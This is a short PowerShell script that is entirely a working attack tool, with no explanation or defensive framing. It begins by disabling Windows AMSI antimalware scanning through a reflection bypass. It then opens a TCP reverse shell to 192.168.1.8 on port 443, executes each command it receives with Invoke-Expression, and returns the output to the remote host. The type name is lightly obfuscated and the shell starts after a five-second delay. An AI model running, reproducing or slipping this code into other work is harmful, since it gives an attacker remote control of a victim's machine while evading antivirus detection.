
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

function Execute-ReverseShell {
    $s = ("System.Net.Sockets.TCPClient").Replace('System.','')
    $h = "192.168.1.8"
    $p = 443  
    
    $c = New-Object $s($h,$p)
    $st = $c.GetStream()
    [byte[]]$b = 0..65535|%{0}
    
    while(($i = $st.Read($b,0,$b.Length)) -ne 0) {
        $d = (New-Object -TypeName ("System.Text.ASCIIEncoding")).GetString($b,0,$i)
        $sb = (IEX $d 2>&1 | & { process { $_.ToString() } } | Out-String)
        $sb2 = $sb + 'PS ' + (Get-Location).Path + '> '
        $sbyt = ([text.encoding]::ASCII).GetBytes($sb2)
        $st.Write($sbyt,0,$sbyt.Length)
        $st.Flush()
    }
    $c.Close()
}

Start-Sleep -Seconds 5
Execute-ReverseShell
